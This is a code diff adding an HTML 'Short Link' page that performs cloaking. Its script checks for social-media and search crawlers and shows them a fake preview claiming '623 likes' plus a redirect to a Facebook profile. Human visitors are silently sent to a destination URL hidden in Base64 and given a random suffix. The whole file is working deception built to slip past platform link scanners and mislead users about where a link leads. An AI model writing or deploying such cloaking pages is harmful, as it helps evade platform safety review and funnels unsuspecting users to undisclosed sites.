@@ -1,0 +1,54 @@
+<!doctype html>
+<html lang="en">
+<head>
+
+<meta http-equiv="refresh" content="4; url=https://web.facebook.com/profile.php?id=61585316557333">
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<title>Short Link</title>
+
+<!-- FB / Social Preview -->
+<meta property="og:title" content="Short Link">
+<meta property="og:description" content="623 likes, shares & comments">
+<meta property="og:image" content="https://via.placeholder.com/600x315.png">
+<meta property="og:url" content="https://your-domain.com/">
+<meta name="robots" content="index, follow">
+</head>
+
+<body>
+
+<script>
+// Bot Detection
+const bots = [
+  /facebookexternalhit/i, /Facebot/i, /Twitterbot/i, /Googlebot/i,
+  /bingbot/i, /Discordbot/i, /Slackbot/i, /LinkedInBot/i,
+  /WhatsApp/i, /Preview/i
+];
+
+const isBot = bots.some(b => b.test(navigator.userAgent));
+
+// Strong encrypted URL (Base64)
+const encrypted =
+"aHR0cHM6Ly93b3JkcHJlc3MtMTUyMzQ0MS01ODYzNzc5LmNsb3Vkd2F5c2FwcHMuY29tL3ZpcmFsYnV6ejMvP3V0bV9zb3VyY2U9SGFqaUcmdXRtX21lZGl1bT1DcmF6eQ==";
+
+function decrypt(x){
+  return atob(x);
+}
+
+function rand(n){
+  const c="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+  let s="";
+  for(let i=0;i<n;i++) s+=c[Math.floor(Math.random()*c.length)];
+  return s;
+}
+
+// Instant redirect (humans only)
+if(!isBot){
+  window.location.replace(decrypt(encrypted) + "&r=" + rand(6));
+}
+</script>
+
+</body>
+</html>
